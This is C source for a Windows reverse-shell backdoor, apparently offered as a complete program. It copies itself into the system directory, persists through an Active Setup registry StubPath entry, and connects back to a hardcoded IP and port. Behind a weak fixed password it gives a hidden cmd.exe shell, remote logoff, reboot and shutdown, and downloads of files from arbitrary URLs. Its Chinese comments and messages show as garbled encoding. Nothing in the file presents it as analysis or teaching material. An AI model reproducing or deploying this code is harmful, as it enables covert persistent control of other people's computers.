/**���ܵ����ţ�����������֤���ܣ��������أ�ϵͳ���ƹ���*/
#include "bd.h"

BOOL bExit = FALSE;
#define RECV_BUF_LEN 4096
#define CMD_BUF_LEN  500
#define CMD_SHOW_FLAG  _T("bd> ")
#define CMD_SHELL_FLAG _T("bd>cmdShell")
#define LOGON_PASSWORD _T("123456")
#define SEND_FLAG(m_sock, CMD_SHOW_FLAG) (SendData(m_sock, CMD_SHOW_FLAG, sizeof(CMD_SHOW_FLAG)))
#define ACTIVE_X_REG _T("Software\\Microsoft\\Active Setup\\Installed Components\\{F839DE9E-B7CF-480b-9250-A844A36DD1A2}")

BOOL SocketInit(){
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) == NO_ERROR) {
		return TRUE;
	}
	else{
		return FALSE;
	}
}

int SendData(SOCKET m_Sock, void *pBuf, DWORD dwBufLen){
	if (m_Sock == INVALID_SOCKET || !pBuf || dwBufLen <= 0) {
		return -1;
	}
	int iCurrSend = 0, offset = 0;
	do {
		iCurrSend = send(m_Sock, (char *)pBuf + offset, dwBufLen, 0);
		if (iCurrSend <= 0) {
			break;
		}
		dwBufLen -= iCurrSend;
		offset += iCurrSend;
	} while (dwBufLen > 0);
	return offset;
}

DWORD WINAPI ThreadOutputProc(LPVOID lpParam){
	CThreadNode tNode = *(CThreadNode *)lpParam;
	char szBuf[RECV_BUF_LEN] = { 0 };
	DWORD dwReadLen = 0, dwTotalAvail = 0;
	BOOL bRet = FALSE;
	while (!bExit) {
		dwTotalAvail = 0;
		bRet = PeekNamedPipe(tNode.hPipe, NULL, 0, NULL, &dwTotalAvail, NULL);
		if (bRet && dwTotalAvail > 0) {
			bRet = ReadFile(tNode.hPipe, szBuf, RECV_BUF_LEN, &dwReadLen, NULL);
			if (bRet && dwReadLen > 0) {
				SendData(tNode.m_Sock, szBuf, dwReadLen);
			}
		}
		Sleep(50);
	}
	return TRUE;
}

BOOL GetCmdString(SOCKET m_Sock, LPTSTR lpszCmdBuf){
	if (m_Sock == INVALID_SOCKET || !lpszCmdBuf) {
		return FALSE;
	}
	int iRet = 0;
	TCHAR sztBuf[2] = { 0 }, szCmdBuf[CMD_BUF_LEN] = { 0 };
	while (TRUE) {
		iRet = recv(m_Sock, sztBuf, 1, 0);
		if (iRet == 0 || iRet == SOCKET_ERROR) {
			return FALSE;
		}
		if (sztBuf[0] != '\r' && sztBuf[0] != '\n') {
			_tcscat_s(szCmdBuf, CMD_BUF_LEN, sztBuf);
		}
		else{
			break;
		}
		Sleep(50);
	}
	if (_tcslen(szCmdBuf) > 0) {
		_tcscpy_s(lpszCmdBuf, CMD_BUF_LEN, szCmdBuf);
	}
	return TRUE;
}

BOOL CheckPassword(SOCKET m_Sock){
	int iRecved = 0;
	TCHAR szBuf[2] = { 0 }, 
		  szCmdBuf[CMD_BUF_LEN] = { 0 };
	
	TCHAR szPass[]    = _T("\r\n���������룺");
	TCHAR szSucceed[] = _T("��½�ɹ���\r\n"), 
		  szFailed[]  = _T("������󣬵�¼ʧ��!");

	if (SendData(m_Sock, szPass, _tcslen(szPass)) > 0 &&
		GetCmdString(m_Sock, szCmdBuf)) {
		
		if (_tcscmp(szCmdBuf, LOGON_PASSWORD) == 0) {
			SendData(m_Sock, szSucceed, _tcslen(szSucceed));
			return TRUE;
		}
		else{
			SendData(m_Sock, szFailed, _tcslen(szFailed));
		}
	}
	return FALSE;
}

DWORD WINAPI CmdShellProc(LPVOID lpParam){
	SOCKET m_Sock = (SOCKET)lpParam;
	TCHAR szCmdBuf[CMD_BUF_LEN] = { 0 }, 
		  szCmdLine[CMD_BUF_LEN] = { 0 };
	SECURITY_ATTRIBUTES sa = { 0 };
	HANDLE hReadPipe = NULL, hWritePipe = NULL;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
		return FALSE;
	}

	DWORD dwThreadID = 0;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.hStdOutput = si.hStdError = hWritePipe;
	si.wShowWindow = SW_HIDE;
	CThreadNode m_ReadNode;
	m_ReadNode.m_Sock = m_Sock;
	m_ReadNode.hPipe = hReadPipe;
	SEND_FLAG(m_Sock, CMD_SHELL_FLAG);
	HANDLE hThread = CreateThread(NULL, 0, ThreadOutputProc, &m_ReadNode, 0, &dwThreadID);
	while (GetCmdString(m_Sock, szCmdBuf)) {
		if (_tcslen(szCmdBuf) > 0) {
			if (_tcsicmp(szCmdBuf, _T("exit")) == 0) {
				break;
			}
			ZeroMemory(szCmdLine, CMD_BUF_LEN);
			GetSystemDirectory(szCmdLine, CMD_BUF_LEN);
			_tcscat_s(szCmdLine, CMD_BUF_LEN, _T("\\cmd.exe /c "));
			_tcscat_s(szCmdLine, CMD_BUF_LEN, szCmdBuf);
			CreateProcess(NULL, szCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
			WaitForSingleObject(pi.hProcess, INFINITE); //The cmd.exe process is over;
		}
		Sleep(50);
		//SEND_FLAG(m_Sock, CMD_SHELL_FLAG);
	}
	bExit = TRUE;
	WaitForSingleObject(hThread, INFINITE);
	bExit = FALSE;
	return TRUE;
}
BOOL EnableShutDownPriv(){
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tkp = { 0 };
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		return FALSE;
	}
	if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return FALSE;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}
	return TRUE;
}

BOOL ReSetWindows(DWORD dwFlags, BOOL bForce){
	//Check the param;
	if (dwFlags != EWX_LOGOFF && dwFlags != EWX_REBOOT && dwFlags != EWX_SHUTDOWN) {
		return FALSE;
	}

	//Get the os version;
	OSVERSIONINFO osvi = { 0 };
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if (!GetVersionEx(&osvi)) {
		return FALSE;
	}
	if (osvi.dwPlatformId == VER_PLATFORM_WIN32_NT) {
		EnableShutDownPriv();
	}
	dwFlags |= (bForce != FALSE) ? EWX_FORCE : EWX_FORCEIFHUNG;
	return ExitWindowsEx(dwFlags, 0);
}

BOOL CheckFileExist(LPCTSTR lpszPath){
	if (GetFileAttributes(lpszPath) == INVALID_FILE_ATTRIBUTES && GetLastError() == ERROR_FILE_NOT_FOUND) {
		return FALSE;
	}
	else{
		return TRUE;
	}
}

BOOL DownFileFunc(SOCKET m_Sock){
	if (m_Sock == INVALID_SOCKET || m_Sock == SOCKET_ERROR) {
		return FALSE;
	}
	BOOL bRet = TRUE;
	TCHAR szDstUrl[CMD_BUF_LEN] = { 0 }, 
		  szDstPath[CMD_BUF_LEN] = { 0 };
	if (SendData(m_Sock, _T("������Ŀ���ļ���URL��"), _tcslen(_T("������Ŀ���ļ���URL��"))) > 0 && 
		GetCmdString(m_Sock, szDstUrl)) {
		if (SendData(m_Sock, _T("������Ŀ���ļ��ı���·����"), _tcslen(_T("������Ŀ���ļ��ı���·����"))) > 0 && 
			GetCmdString(m_Sock, szDstPath)) {

			while (CheckFileExist(szDstPath)) {
				SendData(m_Sock, _T("�ļ��Ѵ�������������·����"), _tcslen(_T("�ļ��Ѵ�������������·����")));
				GetCmdString(m_Sock, szDstPath);
			}
			SendData(m_Sock, _T("�ļ������У����Եȡ���\r\n"), _tcslen(_T("�ļ������У����Եȡ���\r\n")));
			HRESULT hr = URLDownloadToFile(NULL, szDstUrl, szDstPath, 0, NULL);
			if (hr == S_OK) {
				if (CheckFileExist(szDstPath)) {
					SendData(m_Sock, _T("�ļ����سɹ���\r\n"), _tcslen(_T("�ļ����سɹ���\r\n")));
				}
				else{
					SendData(m_Sock, _T("�ļ����سɹ��������ļ������ڣ��ܿ��ܱ�ɱ�������ɱ��\r\n"), _tcslen(_T("�ļ����سɹ��������ļ������ڣ��ܿ��ܱ�ɱ�������ɱ��\r\n")));
				}
			}
			else if (hr == INET_E_DOWNLOAD_FAILURE) {
				SendData(m_Sock, _T("URL ����ȷ���ļ�����ʧ�ܣ�\r\n"), _tcslen(_T("URL ����ȷ���ļ�����ʧ�ܣ�\r\n")));
				bRet = FALSE;
			}
			else{
				SendData(m_Sock, _T("�ļ�����ʧ�ܣ�����URL�Ƿ���ȷ��\r\n"), _tcslen(_T("�ļ�����ʧ�ܣ�����URL�Ƿ���ȷ��\r\n")));
				bRet = FALSE;
			}
		}
	}
	return bRet;
}

BOOL StartWork(SOCKET m_Sock){
	int iRet = 0;
	TCHAR sztBuf[2] = { 0 }, 
		  szCmdBuf[CMD_BUF_LEN] = { 0 };

	SEND_FLAG(m_Sock, CMD_SHOW_FLAG);
	while (GetCmdString(m_Sock, szCmdBuf)) {
		if (_tcslen(szCmdBuf) > 0) {
			if (_tcsicmp(szCmdBuf, _T("cmdshell")) == 0) {
				//Start the cmd shell;
				DWORD dwThreadId = 0;
				HANDLE hThread = CreateThread(NULL, 0, CmdShellProc, (LPVOID)m_Sock, 0, &dwThreadId);
				WaitForSingleObject(hThread, INFINITE);
			}
			else if (_tcsicmp(szCmdBuf, _T("logoff")) == 0) {
				//logoff the system;
				ReSetWindows(EWX_LOGOFF, FALSE);
			}
			else if (_tcsicmp(szCmdBuf, _T("reboot")) == 0) {
				//reboot the system;
				ReSetWindows(EWX_REBOOT, FALSE);
			}
			else if (_tcsicmp(szCmdBuf, _T("shutdown")) == 0) {
				//shutdown the system;
				ReSetWindows(EWX_SHUTDOWN, FALSE);
			}
			else if (_tcsicmp(szCmdBuf, _T("download")) == 0) {
				DownFileFunc(m_Sock);
			}
		}
		SEND_FLAG(m_Sock, CMD_SHOW_FLAG);
	}//...while(***)...
	return 0;
}

BOOL StartShell(UINT uPort, LPCSTR lpszIpAddr){
	BOOL bRet = TRUE;

	if (!SocketInit()) {
		return FALSE;
	}
	SOCKET m_ConnectSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (m_ConnectSock == INVALID_SOCKET) {
		return FALSE;
	}
	sockaddr_in sServer = { 0 };
	sServer.sin_family  = AF_INET;
	sServer.sin_addr.s_addr = inet_addr(lpszIpAddr);
	sServer.sin_port        = htons(uPort);

	int iRet = 0;
	do {
		iRet = connect(m_ConnectSock, (sockaddr*)&sServer, sizeof(sServer));
	} while (iRet == SOCKET_ERROR);

	//Check the password;
	if (!CheckPassword(m_ConnectSock)) {
		bRet = FALSE;
		goto __Error_End;
	}

	StartWork(m_ConnectSock);

__Error_End:
	if (m_ConnectSock != INVALID_SOCKET) {
		closesocket(m_ConnectSock);
	}
	WSACleanup();
	return bRet;
}

/*
//ʹ�ô�ע����Զ������ķ�ʽ�����ú��ų���
BOOL AutoRunWithReg(){
	BOOL bRet = TRUE;
	HKEY hKey = NULL;
	TCHAR szPath[MAX_PATH] = { 0 };
	TCHAR szSubKey[] = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
	GetModuleFileName(NULL, szPath, MAX_PATH);

	LONG lRet = RegOpenKeyEx(HKEY_CURRENT_USER, szSubKey, 0, KEY_ALL_ACCESS, &hKey);//��ע���ָ����
	if (lRet != ERROR_SUCCESS) {
		bRet = FALSE;
		goto __Error_End;
	}
	lRet = RegSetValueEx(hKey, _T("sBackDoor"), 0, REG_SZ, (BYTE *)szPath, sizeof(szPath));
	if (lRet != ERROR_SUCCESS) {
		bRet = FALSE;
	}

__Error_End:
	if (hKey) {
		RegCloseKey(hKey);
	}
	return bRet;
}
*/

//�����ó���ϵͳ�ļ�·��: C:\windows\system32
BOOL CopyToSysPath(LPTSTR lpszPath, UINT inLen){
	BOOL bRet = FALSE;
	TCHAR szPath[MAX_PATH]     = { 0 }, 
		  szFileName[MAX_PATH] = { 0 };

	GetModuleFileName(NULL, szPath, MAX_PATH);
	UINT uLen = _tcslen(szPath);
	for (int idx = uLen; idx >= 0; idx--) {
		if (szPath[idx] == '\\') {
			_tcsncpy_s(szFileName, MAX_PATH, szPath + idx, uLen - idx);
			break;
		}
	}
	GetSystemDirectory(lpszPath, inLen);
	_tcscat_s(lpszPath, inLen, szFileName);
	bRet = CopyFile(szPath, lpszPath, FALSE);
	if (bRet) {
		return TRUE;
	}
	else if (GetLastError() == ERROR_SHARING_VIOLATION){
		return TRUE;
	}
	else{
		return FALSE;
	}
}

DWORD WINAPI RegWatchProc(LPVOID lpParam){
	LONG lRet = ERROR_SUCCESS;
	do {
		Sleep(100);
		lRet = RegDeleteKey(HKEY_CURRENT_USER, ACTIVE_X_REG);
	} while (lRet == ERROR_FILE_NOT_FOUND);
	return 0;
}

void AutoRunWithActiveX(LPCTSTR lpszCmdLine){
	if (!lpszCmdLine) {//���в���������Ҫ,�״����г��򣬲�������Ϊ0
		return;
	}
	if (_tcslen(lpszCmdLine) == 0) {
		HKEY hLKey = NULL;
		TCHAR szPath[MAX_PATH] = { 0 };

		RegCreateKeyEx(HKEY_LOCAL_MACHINE, ACTIVE_X_REG, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hLKey, NULL);
		CopyToSysPath(szPath, MAX_PATH);
		RegSetValueEx(hLKey, _T("StubPath"), 0, REG_SZ, (BYTE *)szPath, sizeof(szPath));
		RegCloseKey(hLKey);
		ShellExecute(NULL, _T("open"), szPath, _T("exec"), NULL, SW_HIDE);//��㴫��һ��������_T("exec")����������󣬲������Ȳ�Ϊ0
	}
	else{
		CreateThread(NULL, 0, RegWatchProc, NULL, 0, NULL);
		//
		StartShell(9527, _T("192.168.0.2"));
	}
}
///////////////////////////////////////////////////////////////////
int APIENTRY _tWinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPTSTR    lpCmdLine,
	int       nCmdShow){

	/*
	if (AutoRunWithReg()){
		MessageBox(NULL, _T("���������ɹ���"), _T("��ʾ"), MB_OK);
	}
	*/

	//StartShell(3333, _T("192.168.0.100"));

	AutoRunWithActiveX(lpCmdLine);

	return 0;
}